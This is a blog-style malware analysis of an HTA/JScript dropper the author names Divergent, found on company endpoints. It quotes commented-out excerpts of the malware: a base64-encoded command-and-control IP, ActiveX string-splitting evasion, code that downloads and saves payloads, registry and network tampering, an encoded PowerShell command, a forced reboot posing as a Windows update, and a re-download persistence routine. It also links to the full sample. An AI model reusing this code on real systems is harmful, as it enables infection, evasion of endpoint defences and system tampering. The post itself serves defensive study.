![Github](Post%20Images/github.png) [Github](https://github.com/0v3rride)

# Divergent: The Curious View Into The Mind Of A Malware Creator & Jackass (Part 1)
_____________________________________________________________________


### Preface
Once upon a time at Microsoft Corporation sometime in 1996, a group of individuals thought it would be an excellent idea to allow for arbitrary code execution and calls to the Operating System via webpages rendered in Internet Explorer. This idea came in the form of [ActiveX](https://en.wikipedia.org/wiki/ActiveX), but more specifically ActiveX controls. ActiveX controls are akin to Java applets, which in short means they're dangerous too. This is not a new revelation, but it is a problem that continues to persist in the Windows ecosystem, even the with the advent of Windows 10 and IE 11. You can read more about the specifics [here.](http://www.tezu.ernet.in/~utpal/course_mat/com_ole_actvx/) This 'malware' strain doesn't have a name yet, so I'll refer to it as Divergent due to the executable it drops on the victim machine.

### Overview
Sometime shortly after the first of Feburary, my orginization's EDR solution began alerting us to a generic trojan it was finding on three endpoints belonging to external users. We weren't able to exactly pinpoint the cause of infection, but after viewing the downloads history for one of the victims we observed that a file named ```Player(random_numbers).hta``` was downloaded and pressumably executed via social engineering or plain old end user ignorance. The malware created the following files in the following directories starting at the ```C:\Users\<UserName>\``` directory:
```
|----ProgramData
     |----(randomly_Generated_Name).hta
     |----02sall.js
     |----SystemInformation
          |----node_modules
               |----(I honestly don't remember what was in here off the top of my head, becasue it wasn't important) :)
          |----app.js
          |----constants.js
          |----divergent.exe
          |----mdivergent.exe
          |----node.exe
          |----socks4a.js
          |----WinDivert.dll
          |----WinDivert32.sys
          |----WinDivert64.sys
```
Clean up was simple as this piece of malware is an absolute joke. Looking at the logs, our EDR solution was cleaning and removing zip files. We aren't exactly sure what was in those zip files, but we assumed it was a payload of some sorts or the more components of the malware which were needed in order for it to function fully.

### Some Of The Inner Workings Of 02Sall.js

I'm not posting the full payload in this entry, but you can download a copy of the sample from [here.](https://github.com/0v3rride/Malware-Samples/tree/master/Divergent) Keep in mind that I haven't figured out what every line of code does in this file, but I've read enough to have a good idea of what it does.

#### Setting Up Variables
```
// addr = 'MTAzLjE5NS4xMDAuMjQ2'; //#####IP ADDRESS (C2?) 103.195.100.246
// nodeurl = 'https://nodejs.org/dist/latest-v10.x/win-x86/node.exe'; //#####URL TO DOWNLOAD NODE SERVER SOFTWARE (FOR LISTENER?)
// nodename = 'node.exe';
// archname =  (new Date().getTime())+'.zip'; //#####ZIP FILE NAMING SCHEME
// foldername = 'SystemInformation'; //#####FOLDER/DIRECTORY WHERE COMPONENTS ARE STORED
// point = 'blank';
```
I'm not sure what the purpose of Base64 encoding an IP address would do in this case, but that's the IP in which the script is having the victim call to. However, interestingly enough, the author points to the url of node.exe. Upon going to this url, you will be prompted to save the file which is the node development environment that runs in the command prompt. We suspect this is how the victim machine would listen for incoming commands from the attacker and how data is being sent back to the C2. This is all running in memory, so the only the executable itself touches the disk, which is a legitmate signed binary.

#### Some Evasion Techniques
```
//#####EVASION
// try{
	// throw new Error('.');
// }catch(err){point=err.message}

// S = 'S'; 

// t = 'stack';

// try{
	// throw new Error("t");
// }
// catch(errorobj){
	// t = errorobj.message;
// }
```
This section is pretty self-explanatory. Two exception errors are thrown on purpose to assignt the char value of ```'.'``` to the variable ```point```. The variable ```S``` will be used for something else in the next section as well as the variable ```t```. Again, a value is assigned to ```t``` much in the same way as it was done for the variable ```point```. All of this was presumably done to trick or throw some shade at whatever EDR solution was looking at it. As you already know, it didn't do a very good job of doing so.

#### Instantiating ActiveXObjects
```
####INSTANTIATION OF OBJECTS TO MAKE CALLS TO SERVICES AND APPLICATIONS IN WINDOWS
// wsh = ws = new ActiveXObject('WScript'+point+'Shell'); //#####ACTIVEXOBJECT FOR WSCRIPT.SHELL x2 WS AND WSH
// m = new ActiveXObject('MSXML2'+point+'XMLHTTP'); //#####ACTIVEXOBJECT FOR MSXML2.XMLHTTP
// f = new ActiveXObject('Scripting'+point+'FileSystemObject'); //#####ACTIVEXOBJECT FOR SCRIPTING.FILESYSTEMOBJECT
// shellapp = new ActiveXObject(S+'h'+'e'+'l'+'l'+'.'+'A'+'p'+'p'+'l'+'i'+'c'+'a'+t+'i'+'o'+'n'); //#####ACTIVEXOBJECT FOR SHELL.APPLICATION
```
This is were the relevance of ActiveX components come in that was mentioned earlier. Note that the author is using the [ActiveXObject](https://msdn.microsoft.com/en-us/library/windows/desktop/ms221401(v=vs.85).aspx) to instantiate an automation object as described by [Mozilla.](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Microsoft_Extensions/ActiveXObject) Basically, ```wsh and ws``` variables reference a wscript automation object which every Windows machine has as far as I'm aware of. At this point, one can essentially perform arbitrary code exection and remote code exection using the ```run and exec``` methods of an ActiveXObject. I coudn't find a whole lot of documenation on the ActiveXObject other than a few MSDN, Mozilla, and other articles or documentation. I'll link these in the credits section, but if you have access to a more detailed documentation in regards to the ActiveXObject class, I'd be appreciative if you could share it with me. In addition, also note other techniques or methods of evasion demonstrated by the author.

#### Other Tidbits
```
####FUNCTION TO CHECK IF FILE EXISTS IN WINDOWS FILE SYSTEM
// function FileExists(Path)
// {
	// Path = ws.ExpandEnvironmentStrings(Path);
	// return f.FolderExists(Path) || f.FileExists(Path);
// }

//#####GET ARCHITECTURE OF THE VICTIM MACHINE
// function GetCPUArc()
// {
	// return FileExists('%WinDir%\\syswow64')? 'X64': 'X86'; //#####IF SYSWOW64 EXISTS THEN IT IS AN X64 SYSTEM IF NOT THEN X86 (32BIT)
// }

//#####FUNCTION FOR WMI QUERIES
// function WMIQuery(Moniker, Query)
// {
	// var Service =  GetObject(Moniker),
	// Items = Service.ExecQuery(Query);
	// var objItem = new Enumerator(Items);
	// var arr = new Array();
	// for (var i = 0;!objItem.atEnd();objItem.moveNext(),i++) {
    // arr[i]=objItem.item();
	// }
	// return arr;
// }

//#####CHECK IF THE VICTIM MACHINE IS A WINDOWS 7 OR SERVER 2008 MACHINE
// function iswin7()
// {
	// var Windows = WMIQuery("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2", "Select * from Win32_OperatingSystem" )[0]; //USING FUCNTION CREATED ABOVE
	// if (/windows +7/i.test(Windows.Caption) || /2008/i.test(Windows.Caption)) return true;
	// return false;
// }

//#####TEST TO SEE IF RUNNING IN THE CONTEXT OF A PRIVILEGED USERs (ADMINISTRATOR)
// function IsAdmin()
// {
// var path = f.GetSpecialFolder(1) + "\\IsAdm.txt";
// try{
	// f1 = f.CreateTextFile(path,true);
	// f1.WriteLine("test");
	// f1.Close();
	// f.DeleteFile(path);
	// return true;
// } catch(e) {
// return false;
// }
// }

// function report(param)
// {
	// //WScript.Echo(param);
	// //var http = new ActiveXObject('M'+S+'XML2.'+'XMLHTTP'); //#####MORE EVASION
	// //try{
	// //	http.open('GET','http://localhost:88/'+param,false);
	// //	http.send();
	// //	http.close();
	// //}catch(err){}
// }

// report('start'); //#####START INFECTION?
```

#### Some More Tidbits
```
//#####INSTALLING A KB UPDATE
// function exec_update()
// {
	// try{
	// var filename = 'Windows6.1-KB3033929-x64.msu';
	// if(GetCPUArc()!='X64')
		// filename = 'Windows6.1-KB3033929-x86.msu'; //#####IF NOT X64 DOWNLOAD THIS FILE
	// if(FileExists(wsh.CurrentDirectory+'\\'+foldername+'\\'+filename))
	// {
		// ws.Run('wusa.exe '+wsh.CurrentDirectory+'\\'+foldername+'\\'+filename+' /quiet',0,false);
		// return true;
	// }
	
	// var addres = 'https://download.microsoft.com/download/C/8/7/C87AE67E-A228-48FB-8F02-B2A9A1238099/Windows6.1-KB3033929-x64.msu'
	// if(GetCPUArc()!='X64')
		// addres = 'https://download.microsoft.com/download/3/7/4/37473F39-5728-4153-9A25-64C09DE9ED52/Windows6.1-KB3033929-x86.msu'
	
	// var m = new ActiveXObject('MSXML2'+point+'XMLHTTP');
	// m.open("GET", addres, false);
	// m.send(null);
	// if(m.status!=200)
	// {
		// return false;
	// }
	// xa=new ActiveXObject('ADODB'+point+'Stream');
	// xa.open();
	// xa.type=1;
	// xa.write(m.responseBody);
	// xa.position=0;
	// xa.saveToFile(wsh.CurrentDirectory+'\\'+foldername+'\\'+filename, 2);
	// xa.close();
	// ws.Run('wusa.exe '+wsh.CurrentDirectory+'\\'+foldername+'\\'+filename+' /quiet',1,false);
	// }
	// catch(err){
		// report(err.message);
	// }
// }

//#####SCREWS WITH THE TTL OF THE VICTIM MACHINE VIA THE REGISTRY
// function setTTLandReboot()
// {
	// ws.Run('netsh interface tcp set heuristics ws=disabled',0,true);
	// ws.Run('reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters /v DefaultTTL /t '+((GetCPUArc()=='X64')?'REG_QWORD':'REG_DWORD')+' /d 0x40 /f',0,true);
	// ws.Run('reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters /v Tcp1323Opts /t REG_DWORD /d 0x02 /f',0,true);
	// ws.Run('reg add '+'HKLM'+'\\Software\\ttl /v ttl /t REG_DWORD /d 0x40 /f',0,true);
	// ws.Run('powershell -enc RwBlAHQALQBXAE0ASQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAJwBXAGkAbgAzADIAXwBOAGUAdAB3AG8AcgBrAEEAZABhAHAAdABlAHIAQwBvAG4AZgBpAGcAdQByAGEAdABpAG8AbgAnACAAfAAgAEYAbwByAEUAYQBjAGgALQBPAGIAagBlAGMAdAAgAHsATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEwATQA6AFwAUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABzAGUAcgB2AGkAYwBlAHMAXABUAGMAcABpAHAAXABQAGEAcgBhAG0AZQB0AGUAcgBzAFwASQBuAHQAZQByAGYAYQBjAGUAcwBcACQAKAAkAF8ALgBTAGUAdAB0AGkAbgBnAEkARAApACIAIAAtAE4AYQBtAGUAIAAnAE0AVABVACcAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAARABXAE8AUgBEACAALQBWAGEAbAB1AGUAIAAxADQANAAwAH0A',0,true);
	// ws.Run('shutdown /r /f /c \"Critical_Windows_Update\" /t 120',0,true);
// }

```
The base64 encoded powershell command simply looks for interfaces on the localhost. 

#### Maintaining 'Persistency'
```
//#####MAKE SURE THE FILES IN THE SYSTEMINFORMATION DIRECTORY ARE STILL THERE IF NOT RUN THE WSCRIPT PROCESS AGAIN TO RE-DOWNLOAD EVERYTHING ('PERSISTANCE')
// try {
	// if(FileExists(wsh.CurrentDirectory+'\\'+foldername+'\\app.js')!=true ||
	// FileExists(wsh.CurrentDirectory+'\\'+foldername+'\\divergent.exe')!=true ||
	// FileExists(wsh.CurrentDirectory+'\\'+foldername+'\\mdivergent.exe')!=true ||
	// FileExists(wsh.CurrentDirectory+'\\'+foldername+'\\WinDivert.dll')!=true ||
	// FileExists(wsh.CurrentDirectory+'\\'+foldername+'\\WinDivert32.sys')!=true ||
	// FileExists(wsh.CurrentDirectory+'\\'+foldername+'\\WinDivert64.sys')!=true)
	// {
		// var arch = DecodeBase64(res());
		// if(true)
		// {
			// try{
				// xa=new ActiveXObject('ADODB'+point+'Stream');
				// xa.open();
				// xa.type=1;
				// xa.write(arch);
				// xa.position=0;
				// xa.saveToFile(wsh.CurrentDirectory+'\\'+foldername+'\\'+archname, 2);
				// xa.close();
			// }
			// catch(err5)
			// {
				// //WScript.Echo(err5.message);
				// report('archsave');
				// WScript.Sleep(5*60*1000);
				// WScript.Quit(59);
			// }
			
			// try{
				//DOWNLOAD FILES TO SYSTEMINFORMATION VIA ZIP FILE?
				// files = shellapp.Namespace(wsh.CurrentDirectory+'\\'+foldername+'\\'+archname).Items();
				// shellapp.Namespace(wsh.CurrentDirectory+'\\'+foldername).CopyHere(files,4+16);
				// WScript.Sleep(5000);
				// f.DeleteFile(wsh.CurrentDirectory+'\\'+foldername+'\\'+archname);
			// }
			// catch(errr){
				// report('archunpack');
				// WScript.Sleep(5*60*1000);
				// WScript.Quit(55);
			// }
		// }
		// else{
			// report('archdownloadunpack1');
			// WScript.Sleep(5*60*1000);
			// WScript.Quit(11);
		// }
	// }
// }
// catch(err6){
	// report('archerr');
	// WScript.Sleep(5*60*1000);
	// WScript.Quit(6);
// }
```
The form of persistency for Divergent comes in the lame form of it just simply checking whether or not the files in the ```SystemInformation``` folder or the folder itself exist or not. Simply deleting ```02sall.js``` and the hta file in the ```ProgramData``` directory no longer gave Divergent the opportunity to 'persist' on the affected endpoint.


Again, there's much more source code to this file and the entirety of it can be viewed [here.](https://github.com/0v3rride/Malware-Samples/tree/master/Divergent)
### Conclusion

### Credits

